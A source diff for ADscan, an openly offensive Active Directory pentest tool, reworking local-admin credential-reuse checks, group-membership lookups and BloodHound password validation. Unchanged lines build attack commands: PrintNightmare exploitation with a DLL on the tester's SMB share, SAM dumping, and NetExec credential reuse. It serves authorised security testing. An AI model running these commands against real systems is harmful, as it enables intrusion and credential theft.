@@ -160,7 +160,10 @@ from adscan_internal.bloodhound_ce_compose import (
     compose_up,
     ensure_bloodhound_compose_file,
 )
-from adscan_internal.bloodhound_ce_password import ensure_bloodhound_admin_password
+from adscan_internal.bloodhound_ce_password import (
+    ensure_bloodhound_admin_password,
+    validate_bloodhound_admin_password_policy,
+)
 from adscan_internal.bloodhound_legacy import (
     LegacyNeo4jConfig,
     ensure_neo4j_not_running,
@@ -543,7 +546,10 @@ def _sudo_validate() -> bool:
     Delegates to ``adscan_internal.sudo_utils.sudo_validate()`` for the core
     logic and adds Rich error output and telemetry capture on failure.
     """
-    from adscan_internal.sudo_utils import sudo_validate as _core_validate, _is_non_interactive
+    from adscan_internal.sudo_utils import (
+        sudo_validate as _core_validate,
+        _is_non_interactive,
+    )
 
     try:
         result = _core_validate()
@@ -1763,7 +1769,6 @@ def _apply_effective_user_home_to_env(env: dict[str, str]) -> dict[str, str]:
         env.setdefault("LOGNAME", sudo_user)
 
     return env
-
 
 
 def _build_effective_user_env_for_command(
@@ -3334,9 +3339,16 @@ try:
     print_info_debug(
         f"[MODULE_DIAG] adscan.py module execution: execution_id={module_execution_id}"
     )
-    system_context = telemetry.collect_system_context()
-    print_info_debug(f"[env] System context: {system_context}")
-    telemetry.capture("telemetry_system_context", system_context)
+    # Host launcher already emits system context for Docker-mode commands.
+    # Avoid duplicating this event from inside the runtime container.
+    if os.getenv("ADSCAN_CONTAINER_RUNTIME") != "1":
+        system_context = telemetry.collect_system_context()
+        print_info_debug(f"[env] System context: {system_context}")
+        telemetry.capture("telemetry_system_context", system_context)
+    else:
+        print_info_debug(
+            "[env] Skipping runtime system context emission; host launcher already captured it."
+        )
 except Exception as exc:  # pragma: no cover - best-effort logging only
     try:
         telemetry.capture_exception(exc)
@@ -8498,6 +8510,18 @@ def _install_bloodhound_ce(
     return True
 
 
+def _parse_bh_admin_password_arg(value: str) -> str:
+    """argparse type validator for BloodHound CE admin password."""
+    candidate = str(value or "")
+    is_valid, error_message = validate_bloodhound_admin_password_policy(candidate)
+    if not is_valid:
+        raise argparse.ArgumentTypeError(
+            error_message
+            or "Invalid BloodHound CE admin password (minimum length is 12)."
+        )
+    return candidate
+
+
 def _print_install_summary():
     """Render a professional installation summary panel at the end of installation."""
     from rich.console import Group
@@ -8574,9 +8598,7 @@ def _print_install_summary():
     telemetry_enabled = telemetry._is_telemetry_enabled()
     if telemetry_enabled:
         tele_status = Text("  ON", style="bold green")
-        tele_status.append(
-            " — anonymous, sanitized usage analytics", style="dim"
-        )
+        tele_status.append(" — anonymous, sanitized usage analytics", style="dim")
         renderables.append(tele_status)
         renderables.append(Text(""))
 
@@ -9395,9 +9417,7 @@ class PentestShell:
 
         except KeyboardInterrupt:
             # User pressed Ctrl+C
-            _log_interrupt_debug(
-                kind="keyboard_interrupt", source="questionary.select"
-            )
+            _log_interrupt_debug(kind="keyboard_interrupt", source="questionary.select")
             return None
         except Exception as e:
             # Fallback to a simple numeric selection (no curses).
@@ -10462,6 +10482,7 @@ class PentestShell:
                 AIDependencyError,
                 AIService,
             )
+
             ai_dependency_error_types = (AIDependencyError,)
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
@@ -14076,6 +14097,8 @@ class PentestShell:
         *,
         prompt_for_user_privs_after: bool = True,
         verify_credential: bool = True,
+        verify_local_credential: bool = True,
+        prompt_local_reuse_after: bool = True,
         ui_silent: bool = False,
         ensure_fresh_kerberos_ticket: bool = True,
     ):
@@ -14094,6 +14117,8 @@ class PentestShell:
             source_steps=source_steps,
             prompt_for_user_privs_after=prompt_for_user_privs_after,
             verify_credential=verify_credential,
+            verify_local_credential=verify_local_credential,
+            prompt_local_reuse_after=prompt_local_reuse_after,
             ui_silent=ui_silent,
             ensure_fresh_kerberos_ticket=ensure_fresh_kerberos_ticket,
         )
@@ -14125,6 +14150,31 @@ class PentestShell:
             verify_credential=verify_credential,
             ui_silent=ui_silent,
             ensure_fresh_kerberos_ticket=ensure_fresh_kerberos_ticket,
+        )
+
+    def add_local_credentials_batch(
+        self,
+        *,
+        domain,
+        credentials,
+        skip_hash_cracking=False,
+        source_steps=None,
+        verify_local_credential=True,
+        prompt_local_reuse_after=False,
+        ui_silent=False,
+    ):
+        """Add multiple local credentials via the shared CLI batch helper."""
+        from adscan_internal.cli.creds import add_local_credentials_batch
+
+        return add_local_credentials_batch(
+            shell=self,
+            domain=domain,
+            credentials=credentials,
+            skip_hash_cracking=skip_hash_cracking,
+            source_steps=source_steps,
+            verify_local_credential=verify_local_credential,
+            prompt_local_reuse_after=prompt_local_reuse_after,
+            ui_silent=ui_silent,
         )
 
     def _handle_hash_cracking(self, domain, user, cred):
@@ -15088,6 +15138,18 @@ class PentestShell:
             total_steps=1,
         ):
             return
+        try:
+            from adscan_internal.cli.spraying import (
+                maybe_show_ctf_spraying_recommendation,
+            )
+
+            maybe_show_ctf_spraying_recommendation(
+                self,
+                domain,
+                reason="phase_5_completed",
+            )
+        except Exception as exc:  # pragma: no cover - best-effort UX hint
+            telemetry.capture_exception(exc)
 
         if stop_after_phase == 5:
             return
@@ -15201,6 +15263,7 @@ class PentestShell:
                         self,
                         domain,
                         max_depth=10,
+                        max_paths=None,
                         require_high_value_target=True,
                     )
 
@@ -15511,12 +15574,9 @@ class PentestShell:
             self.domains_data[self.domain]["password"],
             self.domain,
         )
-        target_file = shlex.quote(
-            f"domains/{target_domain}/enabled_computers_ips.txt"
-        )
+        target_file = shlex.quote(f"domains/{target_domain}/enabled_computers_ips.txt")
         command = (
-            f"drop_the_mic_scan.py -vuln all -target {auth} "
-            f"-target-file {target_file}"
+            f"drop_the_mic_scan.py -vuln all -target {auth} -target-file {target_file}"
         )
         marked_target_domain = mark_sensitive(target_domain, "domain")
         print_info(
@@ -15626,6 +15686,26 @@ class PentestShell:
             self,
             domain=domain,
             credential_username=credential_username,
+        )
+
+    def do_smb_guest_benchmark(self, args):
+        """Benchmark guest SMB share strategies and compare speed/coverage.
+
+        Usage: smb_guest_benchmark <domain>
+        """
+        import shlex
+
+        from adscan_internal import print_error
+        from adscan_internal.cli.smb import run_smb_guest_strategy_benchmark
+
+        parts = shlex.split(str(args or ""))
+        if len(parts) != 1:
+            print_error("Usage: smb_guest_benchmark <domain>")
+            return
+
+        return run_smb_guest_strategy_benchmark(
+            self,
+            domain=parts[0],
         )
 
     def do_smb_map_benchmark_history(self, args):
@@ -16893,9 +16973,35 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
         if Confirm.ask(
             "Do you want to check for local admin creds reuse?", default=False
         ):
-            self.local_cred_reuse(domain, user, cred)
+            from adscan_internal.rich_output import mark_sensitive
 
-    def local_cred_reuse(self, domain, user, cred):
+            domain_state = (
+                str(self.domains_data.get(domain, {}).get("auth", "")).strip().lower()
+            )
+            prompt_dump_after_reuse = domain_state not in {"pwned"}
+            if not prompt_dump_after_reuse:
+                marked_domain = mark_sensitive(domain, "domain")
+                marked_user = mark_sensitive(user, "user")
+                print_info_debug(
+                    "[local_reuse] auto host dump follow-up disabled: "
+                    f"domain={marked_domain} user={marked_user} "
+                    f"reason=domain_already_pwned auth={domain_state!r}"
+                )
+            self.local_cred_reuse(
+                domain,
+                user,
+                cred,
+                prompt_dump_after_reuse=prompt_dump_after_reuse,
+            )
+
+    def local_cred_reuse(
+        self,
+        domain,
+        user,
+        cred,
+        *,
+        prompt_dump_after_reuse: bool = False,
+    ):
         """Check local administrator credential reuse via SMB/NetExec."""
         from adscan_internal.cli.smb import run_local_cred_reuse
 
@@ -16904,9 +17010,18 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
             domain=domain,
             username=user,
             credential=cred,
+            prompt_dump_after_reuse=prompt_dump_after_reuse,
         )
 
-    def execute_local_cred_reuse(self, command, domain, user, cred):
+    def execute_local_cred_reuse(
+        self,
+        command,
+        domain,
+        user,
+        cred,
+        *,
+        prompt_dump_after_reuse: bool = False,
+    ):
         """
         Execute a local credential reuse check and process confirmed admin hits.
 
@@ -16919,36 +17034,89 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
         from adscan_internal.rich_output import mark_sensitive
         from adscan_internal import print_info_table
 
+        reuse_targets: list[dict[str, str]] = []
+        outcome_counts: dict[str, int] = {}
+        summary: dict[str, object] = {
+            "domain": domain,
+            "username": user,
+            "credential_type": "hash" if self.is_hash(cred) else "password",
+            "status": "no_reuse",
+            "reuse_targets": [],
+            "unique_ips": [],
+            "created_edges": 0,
+            "outcome_counts": {},
+            "error": None,
+        }
+
         try:
             # Execute the command and wait for its completion.
             # Refactored to subprocess.run as Popen+communicate is blocking.
-            self.run_command(command, timeout=300)
-            # The command writes output to log files; no direct handling of stdout/stderr is required here.
+            completed_process = self.run_command(command, timeout=300)
+            if completed_process:
+                from adscan_internal.cli.smb import (
+                    parse_local_cred_reuse_outcomes,
+                    parse_local_cred_reuse_targets,
+                )
+
+                stdout_text = str(getattr(completed_process, "stdout", "") or "")
+                stderr_text = str(getattr(completed_process, "stderr", "") or "")
+                reuse_targets.extend(parse_local_cred_reuse_targets(stdout_text))
+                reuse_targets.extend(parse_local_cred_reuse_targets(stderr_text))
+                for result in (
+                    parse_local_cred_reuse_outcomes(stdout_text),
+                    parse_local_cred_reuse_outcomes(stderr_text),
+                ):
+                    for code, count in result.items():
+                        outcome_counts[code] = int(outcome_counts.get(code, 0)) + int(
+                            count
+                        )
         except Exception as e:
             telemetry.capture_exception(e)
             print_error("Error executing command.")
             print_exception(show_locals=False, exception=e)
-            return
+            summary["status"] = "error"
+            summary["error"] = str(e)
+            return summary
 
         # Define the log file path that contains the command output
         log_file_path = f"domains/{domain}/smb/{user}_cred_reuse.txt"
+        log_content = ""
         if not os.path.exists(log_file_path):
             marked_log_file_path = mark_sensitive(log_file_path, "path")
             print_warning(f"Log file '{marked_log_file_path}' not found.")
-            return
+        else:
+            try:
+                with open(log_file_path, "r", encoding="utf-8") as log_file:
+                    log_content = log_file.read()
+            except Exception as e:
+                telemetry.capture_exception(e)
+                print_warning("Error reading local credential reuse log.")
+                print_exception(show_locals=False, exception=e)
 
-        try:
-            with open(log_file_path, "r", encoding="utf-8") as log_file:
-                log_content = log_file.read()
-        except Exception as e:
-            telemetry.capture_exception(e)
-            print_error("Error reading local credential reuse log.")
-            print_exception(show_locals=False, exception=e)
-            return
+        from adscan_internal.cli.smb import (
+            parse_local_cred_reuse_outcomes,
+            parse_local_cred_reuse_targets,
+        )
 
-        from adscan_internal.cli.smb import parse_local_cred_reuse_targets
-
-        reuse_targets = parse_local_cred_reuse_targets(log_content)
+        if log_content:
+            reuse_targets.extend(parse_local_cred_reuse_targets(log_content))
+            for code, count in parse_local_cred_reuse_outcomes(log_content).items():
+                outcome_counts[code] = int(outcome_counts.get(code, 0)) + int(count)
+        deduped_targets: list[dict[str, str]] = []
+        seen_target_keys: set[tuple[str, str, str]] = set()
+        for entry in reuse_targets:
+            if not isinstance(entry, dict):
+                continue
+            target_key = (
+                str(entry.get("target") or "").strip().lower(),
+                str(entry.get("hostname") or "").strip().lower(),
+                str(entry.get("ip") or "").strip().lower(),
+            )
+            if target_key in seen_target_keys:
+                continue
+            seen_target_keys.add(target_key)
+            deduped_targets.append(entry)
+        reuse_targets = deduped_targets
         unique_ips = {
             str(item.get("ip") or "").strip()
             for item in reuse_targets
@@ -17000,6 +17168,20 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
         if reuse_targets:
             marked_domain = mark_sensitive(domain, "domain")
             marked_user = mark_sensitive(user, "user")
+            failure_summary = "-"
+            filtered_outcomes = {
+                code: count for code, count in outcome_counts.items() if code != "PWN3D"
+            }
+            if filtered_outcomes:
+                ordered_outcomes = sorted(
+                    filtered_outcomes.items(),
+                    key=lambda item: (-int(item[1]), str(item[0])),
+                )
+                failure_summary = ", ".join(
+                    f"{code}={count}" for code, count in ordered_outcomes[:5]
+                )
+                if len(ordered_outcomes) > 5:
+                    failure_summary += f", +{len(ordered_outcomes) - 5} more"
             print_panel(
                 "\n".join(
                     [
@@ -17011,7 +17193,8 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                         "This creates direct lateral movement paths between compromised hosts.",
                         "",
                         f"Confirmed hosts: {len(reuse_targets)}",
-                        f"Graph steps created (LocalAdminPassReuse): {created_edges}",
+                        f"Filtered responses: {failure_summary}",
+                        f"New graph steps created (LocalAdminPassReuse): {created_edges}",
                     ]
                 ),
                 title="[bold magenta]Credential Reuse Impact[/bold magenta]",
@@ -17037,7 +17220,6 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                         {
                             "Host": mark_sensitive(host_raw or "-", "hostname"),
                             "IP": mark_sensitive(ip_raw or "-", "ip"),
-                            "Target": mark_sensitive(target_raw or "-", "hostname"),
                             "Evidence": "Local admin session confirmed (Pwn3d)",
                         },
                     )
@@ -17053,7 +17235,7 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                 ]
                 print_info_table(
                     reuse_rows,
-                    ["Host", "IP", "Target", "Evidence"],
+                    ["Host", "IP", "Evidence"],
                     title="Local Admin Password Reuse Targets",
                 )
         else:
@@ -17072,8 +17254,22 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                 expand=False,
             )
 
-        if len(unique_ips) > 0:
+        if len(unique_ips) > 0 and prompt_dump_after_reuse:
             self.ask_for_dump_host(domain, target_file_path, user, cred, "True")
+        elif len(unique_ips) > 0:
+            marked_domain = mark_sensitive(domain, "domain")
+            marked_user = mark_sensitive(user, "user")
+            print_info_debug(
+                "[local_reuse] skipping auto host dump follow-up: "
+                f"domain={marked_domain} user={marked_user} "
+                "reason=disabled_by_caller"
+            )
+        summary["status"] = "reused" if reuse_targets else "no_reuse"
+        summary["reuse_targets"] = list(reuse_targets)
+        summary["unique_ips"] = sorted(unique_ips)
+        summary["created_edges"] = created_edges
+        summary["outcome_counts"] = dict(outcome_counts)
+        return summary
 
     def dump_sam(self, domain, username, password, host, islocal):
         """Dump SAM database via SMB/NetExec."""
@@ -17258,10 +17454,7 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
             f"{self.domains_data[target_domain]['pdc']}"
         )
         dll_path = f"\\\\{self.myip}\\smbFolder\\pnightmare2.dll"
-        command = (
-            f"printnightmare.py {shlex.quote(target)} "
-            f"{shlex.quote(dll_path)}"
-        )
+        command = f"printnightmare.py {shlex.quote(target)} {shlex.quote(dll_path)}"
         print_info("Exploiting PrintNightmare")
         self.execute_printnightmare(command, target_domain)
 
@@ -17991,6 +18184,7 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
 
     def netexec_extract_smb(self, domain):
         from adscan_internal.cli.service_lists import extract_services
+
         command = (
             f"{shlex.quote(self.netexec_path)} smb smb/ips.txt "
             f"| grep -F {shlex.quote(domain)}"
@@ -17999,6 +18193,7 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
 
     def netexec_extract_rdp(self, domain):
         from adscan_internal.cli.service_lists import extract_services
+
         command = (
             f"{shlex.quote(self.netexec_path)} smb rdp/ips.txt "
             f"| grep -F {shlex.quote(domain)}"
@@ -18007,6 +18202,7 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
 
     def netexec_extract_mssql(self, domain):
         from adscan_internal.cli.service_lists import extract_services
+
         command = (
             f"{shlex.quote(self.netexec_path)} smb mssql/ips.txt "
             f"| grep -F {shlex.quote(domain)}"
@@ -19888,7 +20084,9 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
 
     def list_zip(self, zip_file):
         try:
-            from adscan_internal.services.zip_processing_service import ZipProcessingService
+            from adscan_internal.services.zip_processing_service import (
+                ZipProcessingService,
+            )
 
             print_info(f"Listing contents of {zip_file}")
             service = ZipProcessingService()
@@ -19924,7 +20122,9 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
     def extract_zip(self, zip_file, domain):
         try:
             print_info(f"Attempting to extract ZIP file: {zip_file}")
-            from adscan_internal.services.zip_processing_service import ZipProcessingService
+            from adscan_internal.services.zip_processing_service import (
+                ZipProcessingService,
+            )
 
             service = ZipProcessingService()
             inspection = service.inspect_zip_file(zip_path=str(zip_file))
@@ -20297,7 +20497,7 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                     )
                 return False
             # Continue with old admin check
-            self.check_old_admin_count(domain, username, password, logging)
+            return self.check_old_admin_count(domain, username, password, logging)
 
         except Exception as e:
             telemetry.capture_exception(e)
@@ -20570,6 +20770,7 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
         password,
         *,
         execute_actions: bool = True,
+        prefer_live_ldap: bool = False,
     ):
         """
         Checks privileged group membership for a user.
@@ -20591,46 +20792,60 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                 print_info_debug(
                     f"[priv-groups] Checking group membership for user {marked_username} in domain {marked_domain}."
                 )
-            from adscan_internal.services.attack_graph_service import (
-                resolve_principal_groups,
-            )
+            privileged_groups = None
+            source = "unknown"
 
-            group_result = resolve_principal_groups(self, domain, username)
-            group_sids = group_result.get("group_sids", [])
-            group_names = group_result.get("groups", [])
-            source = group_result.get("source", "unknown")
-
-            if group_sids:
-                from adscan_internal.services.privileged_group_classifier import (
-                    classify_privileged_membership_from_group_sids,
-                )
-
-                privileged_groups = classify_privileged_membership_from_group_sids(
-                    group_sids
-                ).as_dict()
-                privileged_groups["groups"] = []
+            if prefer_live_ldap:
                 print_info_debug(
-                    "[priv-groups] group SID lookup resolved "
-                    f"{len(group_sids)} SID(s) for {marked_username}@{marked_domain} "
-                    f"(source={source})."
-                )
-            elif group_names:
-                raw_text = "\n".join(f"{group}@{domain}" for group in group_names)
-                privileged_groups = self._parse_privileged_group_output(raw_text)
-                print_info_debug(
-                    "[priv-groups] group name lookup resolved "
-                    f"{len(group_names)} group(s) for {marked_username}@{marked_domain} "
-                    f"(source={source})."
-                )
-            else:
-                print_info_debug(
-                    "[priv-groups] group lookup returned no results for "
-                    f"{marked_username}@{marked_domain} (source={source}); falling back to LDAP."
+                    "[priv-groups] forcing live LDAP lookup for "
+                    f"{marked_username}@{marked_domain} (bypassing cached memberships/BloodHound first-pass)."
                 )
                 privileged_groups = self._check_privileged_groups_with_ldap(
                     domain, username, password
                 )
-                source = "LDAP"
+                source = "ldap-live"
+
+            if privileged_groups is None:
+                from adscan_internal.services.attack_graph_service import (
+                    resolve_principal_groups,
+                )
+
+                group_result = resolve_principal_groups(self, domain, username)
+                group_sids = group_result.get("group_sids", [])
+                group_names = group_result.get("groups", [])
+                source = group_result.get("source", "unknown")
+
+                if group_sids:
+                    from adscan_internal.services.privileged_group_classifier import (
+                        classify_privileged_membership_from_group_sids,
+                    )
+
+                    privileged_groups = classify_privileged_membership_from_group_sids(
+                        group_sids
+                    ).as_dict()
+                    privileged_groups["groups"] = []
+                    print_info_debug(
+                        "[priv-groups] group SID lookup resolved "
+                        f"{len(group_sids)} SID(s) for {marked_username}@{marked_domain} "
+                        f"(source={source})."
+                    )
+                elif group_names:
+                    raw_text = "\n".join(f"{group}@{domain}" for group in group_names)
+                    privileged_groups = self._parse_privileged_group_output(raw_text)
+                    print_info_debug(
+                        "[priv-groups] group name lookup resolved "
+                        f"{len(group_names)} group(s) for {marked_username}@{marked_domain} "
+                        f"(source={source})."
+                    )
+                else:
+                    print_info_debug(
+                        "[priv-groups] group lookup returned no results for "
+                        f"{marked_username}@{marked_domain} (source={source}); falling back to LDAP."
+                    )
+                    privileged_groups = self._check_privileged_groups_with_ldap(
+                        domain, username, password
+                    )
+                    source = "LDAP"
 
             if privileged_groups is None:
                 print_info_verbose(
@@ -21222,6 +21437,36 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                                 f"Privilege enumeration for user {marked_username} has been cancelled."
                             )
             else:
+                live_membership = self.check_privileged_groups(
+                    domain,
+                    username,
+                    password,
+                    execute_actions=False,
+                    prefer_live_ldap=True,
+                )
+                is_live_privileged_member = any(
+                    bool((live_membership or {}).get(key))
+                    for key in (
+                        "domain_admin",
+                        "backup_operators",
+                        "Administrators",
+                        "account_operators",
+                    )
+                )
+                if is_live_privileged_member:
+                    print_info_debug(
+                        "[user-privs] Live LDAP membership indicates privileged access "
+                        f"for {marked_username}@{marked_domain} despite adminCount/cache check."
+                    )
+                    self._handle_privileged_group_membership(
+                        domain,
+                        username,
+                        password,
+                        live_membership,
+                        "ldap-live-admincount-bypass",
+                    )
+                    return
+
                 # If the user does not have adminCount=1, ask if privilege enumeration should be executed
                 _offer_attack_paths()
                 if self.domains_data.get(domain, {}).get("auth") == "pwned":
@@ -23044,7 +23289,9 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
                 validate_attack_graph_findings,
             )
         except ImportError:
-            print_info("Attack graph report validation is available with ADscan Report License.")
+            print_info(
+                "Attack graph report validation is available with ADscan Report License."
+            )
             print_info("Learn more: https://www.adscanpro.com/report")
             return
 
@@ -24655,7 +24902,9 @@ if ($ChunkType -eq 1 -or $ChunkType -eq 3) {
             if dcs is not None:
                 self.domains_data.setdefault(domain, {})["dcs"] = dcs
             if dcs_hostnames is not None:
-                self.domains_data.setdefault(domain, {})["dcs_hostnames"] = dcs_hostnames
+                self.domains_data.setdefault(domain, {})["dcs_hostnames"] = (
+                    dcs_hostnames
+                )
 
     def _resolve_ipv4_addresses(
         self, fqdn: str, resolver: str | None = None, *, tcp: bool = False
@@ -26830,7 +27079,9 @@ def _print_check_summary(all_ok: bool):
     console.print(status_panel)
 
 
-def _build_update_context(*, docker_pull_timeout_seconds: int | None = 3600) -> UpdateContext:
+def _build_update_context(
+    *, docker_pull_timeout_seconds: int | None = 3600
+) -> UpdateContext:
     """Build UpdateContext with dependencies from adscan.py."""
     return UpdateContext(
         adscan_base_dir=ADSCAN_BASE_DIR,
@@ -27094,6 +27345,7 @@ if __name__ == "__main__":
         "--bh-admin-password",
         dest="bh_admin_password",
         default="Adscan4thewin!",
+        type=_parse_bh_admin_password_arg,
         help=(
             "BloodHound CE admin password to set during installation "
             "(used for Docker mode and legacy mode)."
@@ -27545,7 +27797,9 @@ if __name__ == "__main__":
             docker_pull_timeout_seconds = int(pull_timeout_arg)
 
         handle_update_command(
-            _build_update_context(docker_pull_timeout_seconds=docker_pull_timeout_seconds)
+            _build_update_context(
+                docker_pull_timeout_seconds=docker_pull_timeout_seconds
+            )
         )
         sys.exit(0)
     elif args.command == "uninstall":
